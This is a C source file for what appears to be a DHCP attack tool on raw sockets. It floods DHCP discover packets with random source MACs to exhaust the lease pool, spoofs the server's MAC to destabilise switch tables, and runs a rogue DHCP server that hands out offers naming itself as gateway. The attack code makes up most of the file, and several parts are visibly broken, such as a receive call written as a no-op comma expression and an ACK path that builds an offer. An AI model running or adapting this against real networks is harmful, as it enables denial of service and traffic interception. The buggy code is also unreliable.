#include "netcode.h"


void writeNetThread(const DhcpStats* stats)
{
    unsigned char dhcpDOS[1500] = {0};
    unsigned char dhcpExhaust[1500] = {0};
    unsigned char flapping[1500] = {0};


    while ((*stats).serverRunning)//keep waiting on server
    {
        //printf("debugging first while loop server ran\n");
        if((*stats).dhcpAttackMode != 1) // if its running and ready get into it
        {
            //printf("debugging got dos ready\n");
            int dhcpExhaustSize = createDHCPExhaust(stats, dhcpExhaust);
            int dhcpFlapSize = createDHCflap(stats, flapping);
            while ((*stats).dhcpAttackMode != 1)
            {
                pthread_mutex_lock(&stats->lock);
                if ((*stats).dhcpAttackMode == 2) //use dos attack
                {
                    //printf("packet size %d \n", dhcpExhaustSize);
                    //printf("debugging got to write  exhaust\n");
                    for (int i = 0; i < 25; i++)
                    {
                        //randomize the mac attack towards the server
                        unsigned char randomsrcMac[6];
                        createRandomMac(randomsrcMac);
                        setSrcMac(dhcpExhaust, randomsrcMac, 6);
                        sendRawPacket((*stats).serverFD, dhcpExhaust, dhcpExhaustSize);
                    }
                }
                else if ((*stats).dhcpAttackMode == 3) //use dhcpExhaust;
                {
                    for (int i = 0; i < 25; i++)
                    {
                        //randomize the mac attack towards the server
                        unsigned char randomsrcMac[6];
                        createRandomMac(randomsrcMac);
                        setSrcMac(dhcpExhaust, randomsrcMac, 6);
                        sendRawPacket((*stats).serverFD, dhcpExhaust, dhcpExhaustSize);
                    }
                }
                else if ((*stats).dhcpAttackMode == 4)
                {
                    for (int i = 0; i < 25; i++)
                    {
                        sendRawPacket((*stats).serverFD, flapping, dhcpFlapSize);
                    }
                }
                pthread_mutex_unlock(&stats->lock);
           }

        }
    }
}


void readNetThread(const DhcpStats* stats)
{
    unsigned char recvBuf[1500] = {0};
    unsigned char offer[1500] = {0};
    unsigned char ack[1500] = {0};


    int received = 0;
    while ((*stats).serverRunning)//keep analyzing till server kills itself
    {
       received = receiveRawPacket((*stats).serverFD, recvBuf, 1500);

        if (!(*stats).serverRunning && isDHCPDiscovery(stats, recvBuf, received))
        {
            pthread_mutex_lock(&stats->lock);

            int sizeOfOffer = createDHCPOffer(stats, offer, recvBuf, received);
            sendRawPacket((*stats).serverFD, offer, sizeOfOffer);

            for (int i = 0; i < 10000000; i++)//only keep waiting for a bit for a response
            {
                received = ((*stats).serverFD, recvBuf, 1500);
                if (isDHCPRequest(recvBuf, received))//got received
                {
                    int offerSiz = createDHCPOffer(stats, ack, recvBuf, received);
                    sendRawPacket((*stats).serverFD, ack, sizeOfOffer);
                }
            }
            pthread_mutex_unlock(&stats->lock);
        }
    }
};

int createRawSocket(const char *iface)
{
    int sockfd;
    struct ifreq ifr;
    struct sockaddr_ll socket_address;
    int ifindex;

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd == -1) {
        perror("Error creating raw socket");
        return -1;
    }

    //Retrieve the interface index using ioctl
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
        perror("Error retrieving interface index");
        close(sockfd);
        return -1;
    }
    ifindex = ifr.ifr_ifindex;

    //Prepare sockaddr_ll structure for binding
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ALL);
    socket_address.sll_ifindex = ifindex;

    //Bind the socket to the specified interface
    if (bind(sockfd, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1) {
        perror("Error binding socket to interface");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

// Sends a raw Ethernet frame
int sendRawPacket(int sockfd, const unsigned char *buffer, int size) {
    ssize_t sent = send(sockfd, buffer, size, 0);
    if (sent == -1) {
        perror("send");
        return -1;
    }
    if ((size_t)sent != size) {
        fprintf(stderr, "Partial packet sent.\n");
        return -1;
    }
    return 0;
}

ssize_t receiveRawPacket(int sockfd, uint8_t *buffer, size_t size) {
    ssize_t bytes_received = recv(sockfd, buffer, size, 0);
    if (bytes_received == -1) {
        perror("recv failed");
        return -1;
    }
    return bytes_received;
}

//dos but change the src macs to crash the server
int createDHCPExhaust(DhcpStats* stats, unsigned char* packet)
{
    int sizing = stringToHex(packet, "ffffffffffff244bfe9547fb080045100148000000008011399600000000ffffffff004400430134d59801010600521237350000000000000000000000000000000000000000244bfe9547fb000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010132040ad82db70c08636c776e63707472370d011c02030f06770c2c2f1a792aff00000000000000000000000000000000000000000000000000",3000);
    unsigned char randomMac[6];
    createRandomMac(randomMac);
    setSrcMac(packet, randomMac, 6);
    return sizing;
}

//set the src mac to the same as the dhcp server to cause l2 table instability
int createDHCflap(DhcpStats* stats, unsigned char* packet)
{
    int sizing = stringToHex(packet, "ffffffffffff244bfe9547fb080045100148000000008011399600000000ffffffff004400430134d59801010600521237350000000000000000000000000000000000000000244bfe9547fb000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010132040ad82db70c08636c776e63707472370d011c02030f06770c2c2f1a792aff00000000000000000000000000000000000000000000000000",3000);
    setSrcMac(packet, (*stats).hexTargetMacAddress, 6);
    return sizing;
}

//keep mac the same but
int createDHCPDos(DhcpStats* stats, unsigned char* packet)
{
    int sizing = stringToHex(packet, "ffffffffffff244bfe9547fb080045100148000000008011399600000000ffffffff004400430134d59801010600521237350000000000000000000000000000000000000000244bfe9547fb000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010132040ad82db70c08636c776e63707472370d011c02030f06770c2c2f1a792aff00000000000000000000000000000000000000000000000000",3000);
    unsigned char randomMac[6];
    createRandomMac(randomMac);
    setSrcMac(packet, randomMac, 6);
    setSrcMac(packet, (*stats).hexTargetMacAddress, 6);
    return sizing;
}


int createDHCPOffer(DhcpStats* stats, unsigned char* packet, unsigned char* discover, int discover_len)
{
    if (packet == NULL || discover == NULL || stats == NULL) {
        fprintf(stderr, "Null pointer provided.\n");
        return -1;
    }

    if (discover_len < 240) { // Minimum length for DHCP Discover packet
        fprintf(stderr, "Discover packet too short.\n");
        return -1;
    }


    memset(packet, 0, 512);


    memcpy(packet, discover, 14);

    memcpy(packet, discover + 6, 6);
    memcpy(packet + 6, discover, 6);

    // Copy IP header from the Discover packet
    memcpy(packet + 14, discover + 14, 20);

    // Set IP addresses
    packet[26] = 192; packet[27] = 168; packet[28] = 1; packet[29] = 1;
    packet[30] = 255; packet[31] = 255; packet[32] = 255; packet[33] = 255;

    memcpy(packet + 34, discover + 34, 8);
    packet[36] = 0x00; packet[37] = 0x43;

    // Copy DHCP header from the Discover packet
    memcpy(packet + 42, discover + 42, 240 - 42);
    packet[42] = 0x02; // Message type: BOOTREPLY
    memcpy(packet + 28, discover + 42 + 12, 4);

    // DHCP Options
    unsigned char* options = packet + 240;
    const unsigned char magic_cookie[4] = {0x63, 0x82, 0x53, 0x63};
    memcpy(options, magic_cookie, 4);
    options += 4;

    *options++ = 53;
    *options++ = 1;
    *options++ = 2;


    *options++ = 54;
    *options++ = 4;
    *options++ = 192; *options++ = 168; *options++ = 1; *options++ = 1;

    *options++ = 1;
    *options++ = 4;
    *options++ = 255; *options++ = 255; *options++ = 255; *options++ = 0;

    *options++ = 3;
    *options++ = 4;
    *options++ = 192; *options++ = 168; *options++ = 1; *options++ = 1;

    *options++ = 6;
    *options++ = 4;
    *options++ = 8; *options++ = 8; *options++ = 8; *options++ = 8;

    *options++ = 51;
    *options++ = 4;
    *options++ = 0x00; *options++ = 0x00; *options++ = 0x0E; *options++ = 0x10;


    *options++ = 255;


    return (options - packet);
}

int createDHCPAck(DhcpStats* stats, unsigned char* packet, unsigned char* discover, int discover_len, unsigned char* offered_ip) {
    if (packet == NULL || discover == NULL || stats == NULL || offered_ip == NULL) {
        fprintf(stderr, "Null pointer provided.\n");
        return -1;
    }

    if (discover_len < 240) {
        fprintf(stderr, "Discover packet too short.\n");
        return -1;
    }


    memset(packet, 0, 512);


    memcpy(packet, discover, 14);


    memcpy(packet, discover + 6, 6);
    memcpy(packet + 6, discover, 6);

    memcpy(packet + 14, discover + 14, 20);

    // Set IP addresses
    packet[26] = 192; packet[27] = 168; packet[28] = 1; packet[29] = 1;
    packet[30] = 255; packet[31] = 255; packet[32] = 255; packet[33] = 255;

    memcpy(packet + 34, discover + 34, 8);
    packet[36] = 0x00; packet[37] = 0x43;

    memcpy(packet + 42, discover + 42, 240 - 42);
    packet[42] = 0x02;
    memcpy(packet + 28, discover + 42 + 12, 4);

    memcpy(packet + 16, offered_ip, 4);

    unsigned char* options = packet + 240;
    const unsigned char magic_cookie[4] = {0x63, 0x82, 0x53, 0x63};
    memcpy(options, magic_cookie, 4);
    options += 4;


    *options++ = 53;
    *options++ = 1;
    *options++ = 5;

    *options++ = 54;
    *options++ = 4;
    *options++ = 192; *options++ = 168; *options++ = 1; *options++ = 1;

    *options++ = 1;
    *options++ = 4;
    *options++ = 255; *options++ = 255; *options++ = 255; *options++ = 0;

    *options++ = 3;
    *options++ = 4;
    *options++ = 192; *options++ = 168; *options++ = 1; *options++ = 1;

    *options++ = 6;
    *options++ = 4;
    *options++ = 8; *options++ = 8; *options++ = 8; *options++ = 8; // Example: Google DNS

    *options++ = 51;
    *options++ = 4;
    *options++ = 0x00; *options++ = 0x00; *options++ = 0x0E; *options++ = 0x10;

    *options++ = 255;

    return (options - packet);
}



bool isDHCPDiscovery(DhcpStats* stats, unsigned char* packet, int packet_len)
{

    if (packet_len < 240) {
        return false;
    }


    if (packet[12] != 0x08 || packet[13] != 0x00) {
        return false;
    }

    if (packet[23] != 0x11) {
        return false;
    }


    if (packet[34] != 0x00 || packet[35] != 0x43 ||
        packet[36] != 0x00 || packet[37] != 0x44) {
        return false;
        }

    if (packet[42] != 0x01) { // 0x01 is BOOTREQUEST
        return false;
    }

    int options_start = 240;
    for (int i = options_start; i < packet_len; ) {
        if (packet[i] == 0xff) {
            break;
        }

        unsigned char option_type = packet[i++];
        unsigned char option_length = packet[i++];

        if (option_type == 53 && option_length == 1) {
            if (packet[i] == 0x01) {
                return true;
            }
        }

        i += option_length;
    }

    return false;
}

bool isDHCPRequest(unsigned char* packet, int packet_len) {

    if (packet_len < 240)
    {
        return false;
    }


    if (packet[12] != 0x08 || packet[13] != 0x00) {

        return false;
    }


    if (packet[23] != 0x11) {
        return false;
    }


    if (packet[34] != 0x00 || packet[35] != 0x44 ||
        packet[36] != 0x00 || packet[37] != 0x43) {
        return false;
        }


    if (packet[42] != 0x01) {
        return false;
    }


    int options_start = 240;
    for (int i = options_start; i < packet_len; ) {
        if (packet[i] == 0xff) {
            break;
        }

        unsigned char option_type = packet[i++];
        unsigned char option_length = packet[i++];

        if (option_type == 53 && option_length == 1) {
            if (packet[i] == 0x03) {
                return true;
            }
        }

        i += option_length;
    }

    return false;
}

void setSrcMac(unsigned char *packet, unsigned char *src, int src_len)
{
    memcpy(packet + 6, src, 6);
}

void setDSTMac(unsigned char *packet, unsigned char *src, int src_len)
{
    memcpy(packet, packet, 6);
}

void setIPType(unsigned char *packet, unsigned char *type, int type_len) {
    // Validate inputs
    if (packet == NULL || type == NULL) {
        fprintf(stderr, "Error: Null pointer provided.\n");
        return;
    }

    if (type_len != 1) { // Protocol type is a single byte
        fprintf(stderr, "Error: Protocol type length must be 1 byte.\n");
        return;
    }

    // IP protocol field is at offset 23 in the Ethernet + IP header
    packet[23] = *type;
}


void setIPDest(unsigned char *packet, unsigned char *dest, int dest_len) {
    // Validate inputs
    if (packet == NULL || dest == NULL) {
        fprintf(stderr, "Error: Null pointer provided.\n");
        return;
    }

    if (dest_len != 4) { // IPv4 addresses are 4 bytes
        fprintf(stderr, "Error: Destination IP length must be 4 bytes.\n");
        return;
    }

    memcpy(packet + 30, dest, 4);
}



void setChecksum(unsigned char *packet)
{
    unsigned char ip_header_length = (packet[14] & 0x0F) * 4;
    unsigned char *udp_header = packet + 14 + ip_header_length;

    udp_header[6] = 0x00;
    udp_header[7] = 0x00;
}

void createRandomMac(unsigned char *mac)
{
    // Seed the random number generator
    srand((unsigned int)time(NULL));

    for(int i = 0; i < 6; i++) {
        mac[i] = (unsigned char)(rand() % 256);
    }

    // Set the local bit (Bit 1) and unset the multicast bit (Bit 0) in the first byte
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

void setSrcIp(unsigned char *packet, unsigned char *src, int src_len)
{
    memcpy(packet + 26, src, 4);
}

